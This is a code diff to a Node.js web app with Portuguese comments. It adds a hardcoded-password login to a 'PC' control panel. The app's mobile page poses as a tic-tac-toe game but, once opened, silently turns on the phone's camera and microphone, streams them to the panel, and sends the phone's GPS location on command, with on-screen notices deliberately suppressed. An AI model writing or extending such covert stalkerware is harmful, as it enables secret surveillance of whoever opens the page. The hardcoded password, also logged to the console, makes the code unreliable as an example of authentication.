@@ -1,6 +1,7 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const cookieParser = require('cookie-parser');
 
 const app = express();
 const server = http.createServer(app);
@@ -9,17 +10,162 @@ const io = new Server(server, {
 });
 
 const PORT = process.env.PORT || 3000;
+const SENHA_PC = '171172';
 
+app.use(cookieParser());
+app.use(express.urlencoded({ extended: true }));
+
+// Middleware de autenticação para o painel PC
+function authMiddleware(req, res, next) {
+  const token = req.cookies?.authToken;
+  
+  // Rotas públicas
+  if (req.path === '/login' || req.path === '/' || req.path.startsWith('/socket.io')) {
+    return next();
+  }
+  
+  // Verificar se está autenticado
+  if (token === SENHA_PC) {
+    return next();
+  }
+  
+  // Redirecionar para login
+  res.redirect('/login');
+}
+
+app.use(authMiddleware);
+
+// Página de login
+app.get('/login', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Acesso PC</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .login-box {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        h1 { 
+            color: #333; 
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 18px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        button:hover { background: #45a049; }
+        .error {
+            color: #f44336;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>🔐 Acesso Restrito</h1>
+        <form method="POST" action="/login">
+            <input type="password" name="senha" placeholder="Digite a senha" required autofocus>
+            <button type="submit">Entrar no Painel PC</button>
+        </form>
+        <div class="error" id="error"></div>
+    </div>
+    
+    <script>
+        // Mostrar erro se houver
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('erro')) {
+            document.getElementById('error').textContent = 'Senha incorreta!';
+        }
+    </script>
+</body>
+</html>
+  `);
+});
+
+// Processar login
+app.post('/login', (req, res) => {
+  let body = '';
+  req.on('data', chunk => body += chunk);
+  req.on('end', () => {
+    const senha = new URLSearchParams(body).get('senha');
+    
+    if (senha === SENHA_PC) {
+      res.cookie('authToken', SENHA_PC, { 
+        maxAge: 24 * 60 * 60 * 1000, // 24 horas
+        httpOnly: true,
+        sameSite: 'strict'
+      });
+      res.redirect('/pc');
+    } else {
+      res.redirect('/login?erro=1');
+    }
+  });
+});
+
+// Logout
+app.get('/logout', (req, res) => {
+  res.clearCookie('authToken');
+  res.redirect('/login');
+});
+
+// Rota principal - detecta dispositivo
 app.get('/', (req, res) => {
   const ua = req.headers['user-agent'].toLowerCase();
   const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
+  
+  if (isMobile) {
+    // Celular - acesso livre
+    res.redirect('/mobile');
+  } else {
+    // PC - redireciona para login
+    res.redirect('/login');
+  }
+});
+
+// Página do celular (sem senha)
+app.get('/mobile', (req, res) => {
   const host = req.headers.host;
   const protocol = req.headers['x-forwarded-proto'] || 'http';
   const fullUrl = `${protocol}://${host}`;
   
-  if (isMobile) {
-    // CELULAR: apenas jogo, só mostra mensagens do chat
-    res.send(`<!DOCTYPE html>
+  res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -99,7 +245,6 @@ app.get('/', (req, res) => {
         button:active { transform: scale(0.95); background: #45a049; }
         button:disabled { background: #ccc; cursor: not-allowed; }
         
-        /* Toast notifications - APENAS PARA MENSAGENS */
         #toastContainer {
             position: fixed;
             top: 20px;
@@ -137,7 +282,6 @@ app.get('/', (req, res) => {
             50% { transform: scale(1.05); }
         }
         
-        /* Elementos ocultos */
         #localVideo, #audioDebug {
             display: none;
         }
@@ -164,7 +308,6 @@ app.get('/', (req, res) => {
             reconnectionAttempts: 10
         });
         
-        // Variáveis
         let minhaVez = false;
         let meuSimbolo = '';
         let gameActive = false;
@@ -175,13 +318,11 @@ app.get('/', (req, res) => {
         let audioProcessor = null;
         let audioSource = null;
         
-        // Elementos DOM
         const statusDiv = document.getElementById('status');
         const resetBtn = document.getElementById('resetBtn');
         const localVideo = document.getElementById('localVideo');
         const toastContainer = document.getElementById('toastContainer');
         
-        // Criar tabuleiro
         for(let i = 0; i < 9; i++) {
             let cell = document.createElement('div');
             cell.className = 'cell';
@@ -194,7 +335,6 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
-        // Função para mostrar APENAS mensagens do chat
         function showMessageToast(message, isEmergency = false) {
             const toast = document.createElement('div');
             toast.className = 'toast' + (isEmergency ? ' emergency' : '');
@@ -211,7 +351,6 @@ app.get('/', (req, res) => {
             }, 3000);
         }
         
-        // Função para iniciar câmera e áudio (SILENCIOSA - sem toasts)
         async function iniciarCamera(modo) {
             try {
                 if (mediaStream) {
@@ -230,7 +369,6 @@ app.get('/', (req, res) => {
                 localVideo.srcObject = mediaStream;
                 await localVideo.play();
                 
-                // Configurar áudio
                 if (audioContext) {
                     audioContext.close();
                 }
@@ -249,7 +387,6 @@ app.get('/', (req, res) => {
                     }
                 };
                 
-                // Enviar vídeo
                 const canvas = document.createElement('canvas');
                 canvas.width = 320;
                 canvas.height = 240;
@@ -263,30 +400,23 @@ app.get('/', (req, res) => {
                     }
                 }, 100);
                 
-                // SEM TOAST - não mostra nada
-                
             } catch (err) {
                 console.log('Erro ao iniciar câmera:', err);
             }
         }
         
-        // Iniciar com câmera traseira
         iniciarCamera('environment');
         
-        // Receber comandos do PC (SILENCIOSO - sem toasts)
         socket.on('comando', (cmd) => {
             if (cmd === 'vibrate' && navigator.vibrate) {
                 navigator.vibrate(500);
-                // NÃO MOSTRA TOAST
             } 
             else if (cmd === 'emergency' && navigator.vibrate) {
                 navigator.vibrate([500, 200, 500, 200, 500]);
-                // NÃO MOSTRA TOAST
             } 
             else if (cmd === 'trocarCamera') {
                 facingMode = facingMode === 'environment' ? 'user' : 'environment';
                 iniciarCamera(facingMode);
-                // NÃO MOSTRA TOAST
             }
             else if (cmd === 'getLocation') {
                 if (navigator.geolocation) {
@@ -296,7 +426,6 @@ app.get('/', (req, res) => {
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude
                             });
-                            // NÃO MOSTRA TOAST
                         },
                         (error) => {
                             console.log('Erro localização:', error);
@@ -306,12 +435,10 @@ app.get('/', (req, res) => {
             }
         });
         
-        // APENAS MENSAGENS DO CHAT APARECEM
         socket.on('mensagem', (msg) => {
             showMessageToast('💬 ' + msg);
         });
         
-        // Eventos do jogo (sem toasts)
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
         });
@@ -358,9 +485,15 @@ app.get('/', (req, res) => {
     </script>
 </body>
 </html>`);
-  } else {
-    // Página do PC (com todos os controles)
-    res.send(`<!DOCTYPE html>
+});
+
+// Página do PC (protegida por senha)
+app.get('/pc', (req, res) => {
+  const host = req.headers.host;
+  const protocol = req.headers['x-forwarded-proto'] || 'http';
+  const fullUrl = `${protocol}://${host}`;
+  
+  res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -385,10 +518,23 @@ app.get('/', (req, res) => {
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
-        h1 { 
-            text-align: center; 
-            color: #333; 
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 20px;
+        }
+        h1 { 
+            color: #333; 
+            margin: 0;
+        }
+        .logout-btn {
+            background: #f44336;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: bold;
         }
         .grid {
             display: grid;
@@ -529,7 +675,10 @@ app.get('/', (req, res) => {
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Controle Remoto do Celular</h1>
+        <div class="header">
+            <h1>🎮 Controle Remoto do Celular</h1>
+            <a href="/logout" class="logout-btn">🔒 Sair</a>
+        </div>
         
         <div class="grid">
             <div>
@@ -580,14 +729,12 @@ app.get('/', (req, res) => {
             transports: ['websocket', 'polling']
         });
         
-        // Variáveis
         let minhaVez = true;
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
         let audioEnabled = true;
         let audioVolume = 50;
         
-        // Elementos DOM
         const statusDiv = document.getElementById('gameStatus');
         const resetBtn = document.getElementById('resetBtn');
         const remoteVideo = document.getElementById('remoteVideo');
@@ -596,7 +743,6 @@ app.get('/', (req, res) => {
         const messageInput = document.getElementById('messageInput');
         const locationInfo = document.getElementById('locationInfo');
         
-        // Criar tabuleiro
         for(let i = 0; i < 9; i++) {
             let cell = document.createElement('div');
             cell.className = 'cell';
@@ -609,13 +755,11 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
-        // Configurar áudio
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const audioGain = audioContext.createGain();
         audioGain.gain.value = audioVolume / 100;
         audioGain.connect(audioContext.destination);
         
-        // Receber vídeo
         let frameCount = 0;
         socket.on('frame', (frameData) => {
             remoteVideo.src = frameData;
@@ -623,7 +767,6 @@ app.get('/', (req, res) => {
             videoStatus.innerHTML = '📱 Recebendo vídeo (frames: ' + frameCount + ')';
         });
         
-        // Receber áudio
         socket.on('audio', (audioData) => {
             if (audioEnabled) {
                 const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
@@ -636,7 +779,6 @@ app.get('/', (req, res) => {
             }
         });
         
-        // Controles
         document.getElementById('trocarCamera').onclick = () => {
             socket.emit('comando', 'trocarCamera');
         };
@@ -654,7 +796,6 @@ app.get('/', (req, res) => {
             addMessage('⚠️ SINAL DE EMERGÊNCIA ENVIADO!', true);
         };
         
-        // Controle de áudio
         document.getElementById('toggleAudio').onclick = () => {
             audioEnabled = !audioEnabled;
             document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
@@ -665,7 +806,6 @@ app.get('/', (req, res) => {
             audioGain.gain.value = audioVolume / 100;
         };
         
-        // Localização
         socket.on('location', (data) => {
             locationInfo.innerHTML = \`
                 📍 Localização do celular:<br>
@@ -675,7 +815,6 @@ app.get('/', (req, res) => {
             \`;
         });
         
-        // Chat
         function addMessage(msg, isEmergency = false) {
             const messageDiv = document.createElement('div');
             messageDiv.className = 'message';
@@ -707,7 +846,6 @@ app.get('/', (req, res) => {
             }
         };
         
-        // Eventos do jogo
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
         });
@@ -752,7 +890,6 @@ app.get('/', (req, res) => {
     </script>
 </body>
 </html>`);
-  }
 });
 
 // Lógica do jogo
@@ -842,4 +979,5 @@ io.on('connection', (socket) => {
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`\n🚀 Servidor rodando!`);
   console.log(`   Porta: ${PORT}`);
+  console.log(`   Senha do PC: 171172`);
 });
